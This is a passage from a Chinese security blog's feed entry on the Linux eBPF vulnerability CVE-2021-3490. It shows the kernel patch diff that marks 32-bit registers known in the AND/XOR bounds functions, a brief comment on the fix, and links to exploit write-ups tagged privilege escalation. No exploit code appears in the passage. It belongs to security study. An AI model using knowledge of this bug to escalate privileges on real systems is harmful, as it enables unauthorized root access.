safe</span><br><span class="hljs-deletion">- * to skip updating register for known case.</span><br><span class="hljs-deletion">- */</span><br><span class="hljs-deletion">-if (src_known &amp;&amp; dst_known)</span><br><span class="hljs-addition">+if (src_known &amp;&amp; dst_known) &#123;</span><br><span class="hljs-addition">+__mark_reg32_known(dst_reg, var32_off.value);</span><br> return;<br><span class="hljs-addition">+&#125;</span><br> <br> /* We get our maximum from the var_off, and our minimum is the<br>  * maximum of the operands&#x27; minima<br><span class="hljs-meta">@@ -7224,11 +7221,10 @@</span> static void scalar32_min_max_xor(struct bpf_reg_state *dst_reg,<br> struct tnum var32_off = tnum_subreg(dst_reg-&gt;var_off);<br> s32 smin_val = src_reg-&gt;s32_min_value;<br> <br><span class="hljs-deletion">-/* Assuming scalar64_min_max_xor will be called so it is safe</span><br><span class="hljs-deletion">- * to skip updating register for known case.</span><br><span class="hljs-deletion">- */</span><br><span class="hljs-deletion">-if (src_known &amp;&amp; dst_known)</span><br><span class="hljs-addition">+if (src_known &amp;&amp; dst_known) &#123;</span><br><span class="hljs-addition">+__mark_reg32_known(dst_reg, var32_off.value);</span><br> return;<br><span class="hljs-addition">+&#125;</span><br> <br> /* We get both minimum and maximum from the var32_off. */<br> dst_reg-&gt;u32_min_value = var32_off.value;<br></code></pre></td></tr></table></figure><p>笔者认为这个修补方式还是比较成功的</p><h1 id="0xFF-REFERENCE"><a href="#0xFF-REFERENCE" class="headerlink" title="0xFF. REFERENCE"></a>0xFF. REFERENCE</h1><p><a href="https://bsauce.github.io/2021/08/31/CVE-2021-3490">【kernel exploit】CVE-2021-3490 eBPF 32位边界计算错误漏洞</a></p><p><a href="https://xz.aliyun.com/t/11165">eBPF漏洞CVE-2021-3490分析与利用</a></p><p><a href="https://a1ex.online/2021/08/16/ebpf-pwn-A-Love-Story/">ebpf-pwn-A-Love-Story</a></p><p><a href="https://cjovi.icu/WP/1604.html">D^3CTF2022-d3bpf,d3bpf-v2-WP</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;那一天，a3 终于回想起了被 VM Pwn 支配的恐怖&lt;/p&gt;</summary>
    
    
    
    <category term="CVE" scheme="https://arttnba3.github.io/categories/CVE/"/>
    
    
    <category term="Linux" scheme="https://arttnba3.github.io/tags/Linux/"/>
    
    <category term="Linux Kernel" scheme="https://arttnba3.github.io/tags/Linux-Kernel/"/>
    
    <category term="Pwn" scheme="https://arttnba3.github.io/tags/Pwn/"/>
    
    <category term="CVE" scheme="https://arttnba3.github.io/tags/CVE/"/>
    
    <category term="提权" scheme="https://arttnba3.github.io/tags/%E6%8F%90%E6%9D%83/"/>
    
    <category term="eBPF" scheme="https://arttnba3.github.io/tags/eBPF/"/>
    
  </entry>
  
</feed>
